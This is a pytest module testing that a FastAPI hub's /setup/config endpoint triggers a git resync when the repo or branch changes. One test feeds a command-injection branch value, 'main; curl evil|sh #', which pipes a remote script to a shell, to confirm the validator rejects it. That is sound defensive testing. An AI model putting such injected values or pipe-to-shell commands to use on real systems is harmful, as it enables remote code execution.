"""POST /setup/config must trigger an immediate resync when it changes the
hub's repo/branch (Setup -> Cloud/Sync page "repo" / "branch" fields).

Before this fix, saving a new ``global_branch`` or ``update_sources.hub`` only
persisted the value -- the hub kept running whatever it was already checked
out on until the next scheduled repo-sync tick (or a manual "Update now"
click), which let a hub sit on the WRONG branch for a long time after an
admin believed they'd just switched it (this contributed to a real
production incident: a hub stayed on ``main`` although its config said
``lrb``, because the config write never kicked off a resync).

This module pins: an actual repo/branch CHANGE fires the same resync path as
the manual "Update now" button (``run_repo_sync_all(force=True)``,
best-effort / fire-and-forget so the save itself stays fast); a config save
that leaves the repo/branch untouched does NOT spuriously trigger a resync;
and a bad value is still rejected by the existing charset validator before
any of this runs.
"""
import asyncio
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
_ROUTES = os.path.join(os.path.dirname(__file__), "..", "src", "routes")
if _ROUTES not in sys.path:
    sys.path.append(_ROUTES)

import pytest  # noqa: E402
from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

import setup_misc  # noqa: E402


class _FakeCtx:
    def _session_user(self, request):
        return {"user": "admin"}

    def _is_admin(self, sess):
        return True


class _FakeState:
    def __init__(self, global_config=None):
        self.system_state = {"global_config": global_config or {}}
        self.dirty_calls = 0

    def _mark_dirty(self):
        self.dirty_calls += 1


class _FakeRouteHub:
    def __init__(self, global_config=None):
        self.state = _FakeState(global_config)
        self.resync_calls = []

    async def run_repo_sync_all(self, force_spokes=False, force=False):
        self.resync_calls.append((force_spokes, force))
        return {"status": "checked"}


def _build(global_config=None):
    app = FastAPI()
    hub = _FakeRouteHub(global_config)
    app.state.hub = hub
    setup_misc.register(app, hub, _FakeCtx())
    return TestClient(app), hub


def test_changing_global_branch_triggers_immediate_resync():
    c, hub = _build({"global_branch": "main"})
    r = c.post("/setup/config", json={"config": {"global_branch": "lrb"}})
    assert r.status_code == 200
    assert r.json()["resync_triggered"] is True
    assert hub.state.system_state["global_config"]["global_branch"] == "lrb"


def test_changing_hub_repo_url_triggers_immediate_resync():
    c, hub = _build({"update_sources": {"hub": "https://github.com/a/a.git"}})
    r = c.post("/setup/config", json={
        "config": {"update_sources": {"hub": "https://github.com/b/b.git"}}})
    assert r.status_code == 200
    assert r.json()["resync_triggered"] is True


def test_unrelated_config_change_does_not_trigger_resync():
    c, hub = _build({"global_branch": "lrb"})
    r = c.post("/setup/config", json={"config": {"some_other_key": "value"}})
    assert r.status_code == 200
    assert r.json()["resync_triggered"] is False


def test_resaving_the_same_branch_does_not_trigger_resync():
    c, hub = _build({"global_branch": "lrb"})
    r = c.post("/setup/config", json={"config": {"global_branch": "lrb"}})
    assert r.status_code == 200
    assert r.json()["resync_triggered"] is False


def test_first_time_setting_branch_from_unset_triggers_resync():
    c, hub = _build({})
    r = c.post("/setup/config", json={"config": {"global_branch": "lrb"}})
    assert r.status_code == 200
    assert r.json()["resync_triggered"] is True


def test_invalid_branch_is_still_rejected_before_any_resync_logic():
    c, hub = _build({"global_branch": "main"})
    r = c.post("/setup/config",
               json={"config": {"global_branch": "main; curl evil|sh #"}})
    assert r.status_code == 400
    # config must be untouched -- the bad write never reached gc.update().
    assert hub.state.system_state["global_config"]["global_branch"] == "main"


def test_resync_uses_force_true_and_does_not_force_spokes():
    """Matches the manual 'Update now' button's git-level urgency (force=True,
    bypass the pull-side maintenance-window gate) without also forcing an
    unrelated spoke-wide push (force_spokes stays False -- this is 'converge
    MY hub tree now', not 'push everyone now')."""
    c, hub = _build({"global_branch": "main"})
    c.post("/setup/config", json={"config": {"global_branch": "lrb"}})
    # Allow the fire-and-forget asyncio.create_task to run.
    import time
    for _ in range(20):
        if hub.resync_calls:
            break
        time.sleep(0.05)
    assert hub.resync_calls == [(False, True)]
